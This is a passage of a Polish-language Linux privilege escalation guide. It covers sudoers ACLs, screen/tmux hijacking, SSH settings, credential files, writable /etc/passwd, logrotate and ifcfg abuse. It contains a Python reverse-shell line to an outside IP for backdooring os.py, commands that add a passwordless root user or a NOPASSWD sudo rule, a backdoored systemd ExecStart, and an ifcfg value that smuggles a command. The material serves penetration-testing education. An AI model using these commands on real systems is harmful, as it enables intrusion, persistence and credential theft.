### Ukryty backdoor ACL w plikach drop-in sudoers

Częstą błędną konfiguracją jest plik należący do roota w `/etc/sudoers.d/` z uprawnieniami `440`, który mimo to daje użytkownikowi o niskich uprawnieniach dostęp do zapisu za pomocą ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo mimo restrykcyjnych bitów uprawnień:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

To ścieżka utrwalania dostępu/escalacji uprawnień przez ACL o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądu ograniczonego do `ls -l`.

## Otwarte sesje powłoki

Dostęp do sesji GNU Screen między użytkownikami zależy od **konfiguracji i ACL uruchomionej sesji**, a nie tylko od wersji programu. [Dokumentacja GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) informuje, że program musi być skompilowany z obsługą wielu użytkowników; `multiuser on` oraz wpis `acladd` lub odpowiedni wpis `aclchg` przyznają innemu użytkownikowi możliwość dołączenia. [Podręcznik wymaga również setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) do wyszukiwania sesji między użytkownikami. Widoczny socket należący do roota lub plik binarny `screen` z ustawionym SUID same w sobie nie potwierdzają, że można dołączyć do powłoki roota. Zanim uznasz to za ścieżkę eskalacji, sprawdź, czy aktywna sesja obsługuje wielu użytkowników, czy bieżący użytkownik ma efektywne uprawnienia do wprowadzania danych/wykonywania poleceń oraz czy powłoka w tej sesji działa jako uprzywilejowany właściciel.

### screen sessions hijacking

**Lista sesji screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![przejmowanie sesji screen - lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Przejmowanie sesji tmux

To był problem w **starszych wersjach tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez użytkownika root, działając jako użytkownik bez uprawnień.

**Wyświetlanie sesji tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego) — przejmowanie sesji tmux: tmux -S /tmp/dev sess ls Wyświetl listę przy użyciu tego gniazda; możesz uruchomić sesję tmux w tym gnieździe...](<../../images/image (837).png>)

**Dołącz do sesji**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Przewidywalny PRNG OpenSSL w Debianie — CVE-2008-0166

Klucze wygenerowane przy użyciu podatnych kompilacji OpenSSL w Debianie lub jego pochodnych w okresie historycznej podatności mogą mieć przewidywalne wartości losowe; obecna dystrybucja hosta ani załatana wersja OpenSSL nie pozwalają ustalić, w jaki sposób wygenerowano starszy klucz. Sprawdź **konkretny klucz** przy użyciu odpowiedniej historycznej blacklisty i zweryfikuj jego pochodzenie. Podręcznik Debiana [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje sprawdzanie kluczy publicznych i plików `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) dokumentuje poprawkę OpenSSL. Wpis w pliku `authorized_keys` uprzywilejowanego konta jest jedynie wskazówką do eskalacji uprawnień, jeśli odpowiadający mu klucz prywatny można odzyskać, a efektywna polityka SSH nadal akceptuje ten klucz dla tego konta; słaby klucz **hosta** sam w sobie nie jest poświadczeniem umożliwiającym logowanie. Wymień skompromitowane klucze i usuń ich stare autoryzacje.

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślna wartość w upstream OpenSSH to `yes`; konfiguracja dystrybucji może ją nadpisać.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie kluczem publicznym jest dozwolone. Domyślna wartość to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustym hasłem. Domyślna wartość to `no`.

### Pliki kontroli logowania

Te pliki wpływają na to, kto i w jaki sposób może się logować:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkownikom innym niż root i wyświetla zawartą w nim wiadomość.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: baner wyświetlany po zalogowaniu (może ujawnić informacje o środowisku lub konserwacji).

### PermitRootLogin

Określa, czy root może logować się przez SSH. Domyślna wartość w upstream OpenSSH to `prohibit-password`; konfiguracja dystrybucji może ją nadpisać. Możliwe wartości:

- `yes`: root może logować się przy użyciu hasła lub klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może logować się tylko przy użyciu klucza prywatnego i jeśli określono opcje poleceń
- `no` : brak

### Zaufane urzędy certyfikacji certyfikatów użytkowników SSH

`TrustedUserCAKeys` wskazuje klucze publiczne, którym sshd ufa przy podpisywaniu certyfikatów **użytkowników**. Jeśli odpowiadający im klucz prywatny urzędu certyfikacji jest dostępny do odczytu dla użytkownika o niższych uprawnieniach, sprawdź, kto może uzyskać certyfikat i jako które konta mogą uwierzytelniać jego principals. `AuthorizedPrincipalsFile` lub `AuthorizedPrincipalsCommand` mogą ograniczać akceptowane nazwy; jeśli nie skonfigurowano żadnego z nich, certyfikat musi zawierać nazwę docelowego konta. `PermitRootLogin prohibit-password` blokuje uwierzytelnianie roota hasłem, ale nadal może zezwalać na uwierzytelnianie certyfikatem. Sama ujawniona ścieżka do klucza nie dowodzi możliwości uzyskania dostępu: sprawdź parę kluczy publicznego i prywatnego, efektywne reguły `Match`, politykę konta, hasło klucza, jego unieważnienie i akceptowane algorytmy podpisu. Nie umieszczaj bajtów klucza prywatnego w wynikach enumeracji. Zobacz [podręcznik konfiguracji serwera OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Klucz prywatny urzędu certyfikacji może być użyteczny również **bez możliwości odczytu** przez bieżącego użytkownika, jeśli reguła delegowania uprawnień pozwala mu uruchomić nieograniczony [program podpisujący certyfikaty, taki jak `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), z uprawnieniami właściciela klucza. Skoreluj dokładnie dozwolone polecenie i argumenty z dostępem konta podpisującego do klucza, zaufanym kluczem publicznym urzędu certyfikacji w efektywnej konfiguracji sshd, principal akceptowanym dla docelowego konta, okresem ważności certyfikatu oraz polityką logowania tego konta. Delegowane polecenie podpisujące ani sam zaufany plik urzędu certyfikacji nie dowodzą możliwości uzyskania dostępu do innego konta; podczas pasywnej enumeracji nie podpisuj testowego certyfikatu.

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, których można użyć do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Można wskazać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się przy użyciu **klucza prywatnego** użytkownika „**testusername**”, ssh porówna klucz publiczny z Twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala **używać lokalnych kluczy SSH zamiast pozostawiać klucze** (bez haseł!) na serwerze. Dzięki temu możesz **przeskoczyć** przez ssh **na hosta**, a stamtąd **przeskoczyć na kolejnego hosta**, **używając** **klucza** znajdującego się na **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:

```
Host example.com
  ForwardAgent yes
```

Zwróć uwagę, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik przechodzi na inną maszynę, jej host będzie mieć dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać** te **opcje** i zezwalać na tę konfigurację lub jej zabraniać.\
Plik `/etc/sshd_config` może **zezwalać** na przekazywanie ssh-agent lub go **zabraniać** za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest ono włączone).

Jeśli zauważysz, że Forward Agent jest skonfigurowany w danym środowisku, zapoznaj się z poniższą stroną, ponieważ **możesz być w stanie wykorzystać tę konfigurację do eskalacji uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty uruchamiane, gdy użytkownik otwiera nową powłokę**. Dlatego jeśli możesz **zapisywać w którymkolwiek z nich lub go modyfikować, możesz eskalować uprawnienia**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Jeśli zostanie znaleziony jakiś nietypowy skrypt profilu, należy sprawdzić, czy zawiera **wrażliwe informacje**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę albo mogą istnieć ich kopie zapasowe. Dlatego zaleca się **znaleźć wszystkie te pliki** i **sprawdzić, czy można je odczytać**, aby ustalić, **czy zawierają hashe**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

W niektórych przypadkach można znaleźć **hashe haseł** w pliku `/etc/passwd` (lub jego odpowiedniku)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su`, podając `hacker:hacker`

Możesz też użyć poniższych wierszy, aby dodać użytkownika testowego bez hasła.\
OSTRZEŻENIE: możesz obniżyć obecny poziom zabezpieczeń maszyny.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

UWAGA: Na platformach BSD `/etc/passwd` znajduje się w plikach `/etc/pwd.db` i `/etc/master.passwd`. Plik `/etc/shadow` jest również przemianowany na `/etc/spwd.db`.

Sprawdź, czy możesz **zapisywać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisywać do jakiegoś **pliku konfiguracyjnego usługi**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **modyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** możesz zmodyfikować wiersze:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Twoje backdoor zostanie uruchomione przy następnym uruchomieniu Tomcata.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie uda Ci się odczytać ostatniego, ale spróbuj)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Nietypowe lokalizacje/pliki należące do bieżącego użytkownika

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Zmodyfikowane pliki w ostatnich minutach

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Pliki baz danych SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

W czytelnych bazach danych aplikacji sprawdź nazwy tabel i kolumn pod kątem nazw użytkowników i hashy haseł. Znalezienie hasha, odzyskanie hasła i potwierdzenie jego ponownego użycia na koncie lokalnym to osobne kroki; sam ciąg 32 znaków szesnastkowych nie wystarczy, by wnioskować, że to MD5 ani że uzyskano dostęp do konta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Jeśli czytelna historia powłoki zawiera polecenie `sudo`, po którym następuje krótka linia przypominająca hasło, ręcznie sprawdź sąsiednie wpisy. Hasło wpisane w standardowym monicie `sudo` nie jest zapisywane w historii powłoki; następująca po nim linia może być jedynie przypadkowym wpisem do powłoki, a nie dowodem na to, że jest prawidłowym hasłem. Znacznik `.sudo_as_admin_successful` odnotowuje wcześniejsze użycie, a nie aktualne uprawnienia.

### Ukryte pliki

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skrypty/pliki binarne w PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Pliki webowe**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Kopie zapasowe**

Sprawdź pliki, które można odczytać w katalogach kopii zapasowych, a także pliki, których **nazwy** zawierają `backup`: archiwum o nieczytelnej nazwie lub z zaszyfrowanym rozszerzeniem nadal może ujawniać stare dane aplikacji. Zaszyfrowane archiwum jest jedynie potencjalnym źródłem ujawnienia. Odzyskanie hasła, sprawdzenie zawartości, odzyskanie hasha aplikacji oraz ponowne użycie tego hasła do konta Unix to odrębne kroki, które należy zweryfikować; hash w archiwum nie dowodzi, że można się za jego pomocą zalogować lokalnie.

Czytelne kopie zapasowe maszyn wirtualnych również wymagają sprawdzenia. Konfiguracja VirtualBox `.vbox` może wskazywać dołączone obrazy `.vdi` i zawierać metadane klucza szyfrowania dysku; [dokumentacja VirtualBox informuje, że klucz szyfrujący dane jest przechowywany w konfiguracji maszyny wirtualnej](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Zarówno konfiguracja, jak i obraz muszą być dostępne, aby można było przeprowadzić analizę dysku offline. Wolumin systemu gościa może mieć własną [warstwę szyfrowania LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), wymagającą osobnego klucza. Nawet po autoryzowanym odszyfrowaniu stare skrypty lub konfiguracja mogą zawierać hasło; przed uznaniem tego za lokalną eskalację uprawnień ustal, czy dane poświadczenie jest aktualne dla konta na hoście i czy efektywna polityka `sudo` zezwala na wykonanie polecenia z podwyższonymi uprawnieniami. Podczas pasywnego rozpoznania zinwentaryzuj ścieżki i uprawnienia bez kopiowania, odszyfrowywania ani montowania obrazów.

Podczas sprawdzania czytelnego archiwum najpierw wyświetl nazwy jego elementów, zanim cokolwiek rozpakujesz: mogą się w nim znajdować ukryte pliki uwierzytelniające, materiały z kodami odzyskiwania lub klucze SSH, nawet jeśli ich bieżące kopie są chronione. Same nazwy plików wskazują jedynie trop; osobno zweryfikuj zawartość i ewentualne ponowne użycie danych do kont.

Priorytetowo sprawdzaj **czytelne archiwa należące do innego użytkownika** w katalogach kopii zapasowych, zwłaszcza archiwa należące do roota oraz te, do których dostęp umożliwia członkostwo w grupie. Stare archiwum może zawierać konfigurację lub sekret uwierzytelniający, nawet jeśli bieżąca kopia jest chroniona. W przypadku lokalnego interfejsu kopii zapasowych, takiego jak [Backrest](https://garethgeorge.github.io/backrest/), sprawdź efektywne konto usługi oraz to, czy użytkownik o niższych uprawnieniach może odczytać jej konfigurację lub uwierzytelnić się w interfejsie. Jej [hooki](https://garethgeorge.github.io/backrest/docs/hooks) i [interfejs poleceń restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogą działać z uprawnieniami usługi do plików i poleceń; sam nasłuch na interfejsie loopback nie przesądza o skutkach. `passwordBcrypt` w Backrest to zakodowany w base64 hash bcrypt w jego [kodzie uwierzytelniania](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), a nie hasło w postaci jawnej. Zanim uznasz ujawnione archiwum lub interfejs za granicę uprawnień, potwierdź tożsamość usługi, możliwość użycia danych uwierzytelniających oraz dostęp do odpowiedniego planu lub repozytorium.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Znane pliki zawierające hasła

Zapoznaj się z kodem [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Narzędzie wyszukuje **różne pliki, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć w tym celu, jest [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł zapisanych lokalnie na komputerach z systemami Windows, Linux i Mac.

Jeśli plik `/etc/guacamole/guacamole.properties` jest dostępny do odczytu, sprawdź ustawienia połączenia z bazą danych `mysql-*`, `postgresql-*` lub `sqlserver-*`. Jeśli konto ma uprawnienia do odczytu tabel JDBC Guacamole, tabela `guacamole_connection_parameter` może zawierać zapisane wartości `username`, `password`, `private-key` lub `passphrase` dla połączeń SSH. Zacznij od identyfikatorów połączeń i nazw parametrów, a następnie sprawdź tylko odpowiednie wiersze; zapisana wartość może być dynamicznym tokenem lub odwołaniem do sejfu, a nie sekretem, którego można ponownie użyć. Zobacz [schemat JDBC Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) i [parametry połączenia SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Menedżer haseł pswm](https://github.com/Julynx/pswm#usage) domyślnie przechowuje zaszyfrowany sejf w `~/.local/share/pswm/pswm`. Jeśli widzisz sejf innego użytkownika, sprawdź jego właściciela i to, czy Twoje konto rzeczywiście może go odczytać. Sama ścieżka do sejfu nie ujawnia danych uwierzytelniających; odzyskanie hasła głównego, znalezienie hasła do konta, którego można ponownie użyć, i potwierdzenie uprawnień tego konta to osobne kroki.

[Domyślna baza danych Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) znajduje się w `~/.passpie/`; zawiera pęk kluczy `.keys` oraz zaszyfrowane pliki danych uwierzytelniających `.pass` w katalogach grup. Widoczny katalog bazy danych to jedynie wskazówka co do lokalizacji: potwierdź dostęp do klucza i odpowiedniego zaszyfrowanego wpisu, sprawdź, czy wymagane jest hasło główne, oraz ustal, czy odzyskane dane uwierzytelniające należą do konta z wyższymi uprawnieniami. Passpie obsługuje również [niestandardowe ścieżki baz danych](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), więc domyślna ścieżka nie obejmuje wszystkich przypadków. Automatyczne wyszukiwanie powinno wyświetlać metadane bez eksportowania danych uwierzytelniających ani wypisywania materiału kluczowego.

### Dzienniki

Jeśli możesz odczytywać dzienniki, być może znajdziesz w nich **interesujące/poufne informacje**. Im bardziej nietypowy dziennik, tym ciekawszy będzie (prawdopodobnie).\
Ponadto niektóre „**źle**” skonfigurowane (z backdoorem?) **dzienniki audytu** mogą umożliwiać **zapisywanie haseł** w dziennikach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Aby **odczytywać logi, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **będzie bardzo pomocna**.

### Pliki powłoki

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Ogólne wyszukiwanie Creds/Regex

Należy też sprawdzić, czy pliki zawierają słowo „**password**” w **nazwie** lub treści, a także poszukać adresów IP i e-maili w logach oraz hashy za pomocą wyrażeń regularnych.\
Nie będę tutaj opisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie testy wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z prawem zapisu

### Python library hijacking

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona i **możesz zapisywać** w tym folderze lub modyfikować biblioteki Pythona, możesz zmodyfikować bibliotekę OS i dodać do niej backdoor (jeśli możesz zapisywać w folderze, z którego zostanie uruchomiony skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby dodać **backdoor do biblioteki**, dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Eksploatacja logrotate

Uprzywilejowane zadanie `logrotate` może umożliwić zapis do pliku należącego do innego użytkownika, jeśli podczas rotacji faktycznie obraca log znajdujący się w katalogu, który użytkownik o niższych uprawnieniach może podmienić lub przekierować. Sam zapis do logu to tylko wskazówka. Potwierdź dokładną aktywną regułę oraz jej dyrektywy `create`, `olddir` i `su`; efektywną tożsamość procesu harmonogramu; prawa zapisu i przeszukiwania katalogu nadrzędnego logu; a także to, czy zainstalowana kompilacja i polityka pozwalają zmienić miejsce docelowe. Aby zapis do pliku startowego doprowadził do wykonania poleceń, późniejsza uprzywilejowana powłoka musi również wczytać utworzony plik. Sprawdź harmonogram, regułę, wersję i sposób pakowania oraz metadane ścieżki, nie wywołując rotacji ani nie próbując wyścigu.

> [!TIP]
> Nie traktuj `3.18.0` ani żadnego innego numeru wersji jako jedynej granicy podatności. [Dziennik zmian projektu upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) odnotowuje w wielu wydaniach poprawki dotyczące zabezpieczeń katalogów i symlinków, a dystrybucje mogą przenosić poprawki do starszych wersji. [Podręcznik projektu upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) zaleca używanie `su`, gdy root obraca logi w katalogach kontrolowanych przez użytkowników bez uprawnień; zweryfikuj efektywną regułę i rzeczywiste działanie.

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** więc gdy tylko znajdziesz możliwość modyfikowania logów, sprawdź, kto nimi zarządza i czy możesz podnieść uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Plik `ifcfg-*` jest wskazówką wartą sprawdzenia, jeśli użytkownik o niższych uprawnieniach może go utworzyć lub zmienić **i** uprzywileżowana ścieżka aktywacji sieci odczyta właśnie ten plik. Potwierdź efektywne uprawnienia pliku i katalogu, wybrany interfejs, zainstalowaną implementację `ifup`/`ifdown` oraz to, kto ją wywołuje. Sam zapis do pliku nie powoduje wykonania. [Przewodnik Red Hat dotyczący sieci w RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) rozróżnia starsze skrypty sieciowe od NetworkManager: ten drugi sam z siebie nie wywołuje pierwszych. [Dokumentacja RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) informuje, że domyślne `ifup`/`ifdown` korzystają z NetworkManager, a opcjonalny pakiet ze starszymi skryptami dostarcza skrypty powłoki.

W systemie, który faktycznie używa uprzywilejowanych starszych skryptów, przypisanie w pliku `ifcfg-*`, takim jak `NAME=`, bez cudzysłowów i wczytywane przez powłokę może przekroczyć granicę wykonania kodu. Zweryfikuj dokładny parser, wartość i ścieżkę aktywacji; nie zakładaj, że plik jest interpretowany przez powłokę na podstawie samej nazwy pliku ani obecności NetworkManager. Wrapper dozwolony przez sudo, który zapisuje dane wejściowe użytkownika do pliku `ifcfg-*`, a następnie wywołuje starsze `ifup`, stanowi odrębną drogę do przekroczenia tej granicy, nawet jeśli użytkownik nie może bezpośrednio edytować pliku.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Zwróć uwagę na odstęp między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Znajdują się w nim skrypty do `start`, `stop`, `restart`, a czasem także `reload` usług. Można je uruchamiać bezpośrednio lub za pomocą dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. W systemach Redhat alternatywną ścieżką jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym systemem **zarządzania usługami**, wprowadzonym przez Ubuntu, który wykorzystuje pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart skrypty SysVinit są nadal używane wraz z konfiguracjami Upstart dzięki warstwie zgodności w Upstart.

**systemd** to nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automatycznym montowaniem i migawki stanu systemu. Porządkuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucji oraz w `/etc/systemd/system/` dla zmian administratora, usprawniając administrację systemem.<sup>[[21]](#references)</sup>

## Inne sztuczki

### Eskalacja uprawnień NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ucieczka z ograniczonych powłok


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworki rootowania Androida: nadużycie kanału komunikacji z managerem

Frameworki rootowania Androida często podpinają się pod syscall, aby udostępnić uprzywilejowane funkcje jądra managerowi działającemu w przestrzeni użytkownika. Słabe uwierzytelnianie managera (np. kontrole sygnatur oparte na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i uzyskanie uprawnień root na urządzeniach, które są już zrootowane. Więcej informacji i szczegóły exploita znajdziesz tutaj:


{{#ref}}
